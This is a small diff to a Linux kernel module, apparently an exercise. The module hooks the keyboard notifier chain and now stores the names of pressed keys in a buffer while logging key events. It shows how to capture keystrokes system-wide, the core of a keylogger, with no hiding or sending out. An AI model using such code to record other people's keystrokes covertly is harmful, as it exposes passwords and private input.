@@ -11,6 +11,7 @@
 #include <asm/uaccess.h> /* copy_from/to_user */
 
 #include <linux/keyboard.h> /* register_keyboard_notifier etc */
+#include "keymap.h"
 
 #define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );
 
@@ -64,7 +65,7 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
     // struct vc_data *vc = param->vc;
     
     if (code == KBD_KEYCODE) {
-        cur_buf_length = sprintf( key_buffer, "%d\n", param->value );
+        cur_buf_length = sprintf( key_buffer, "%s\n", GET_KEYNAME( param->value ) );
         print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
     }
 
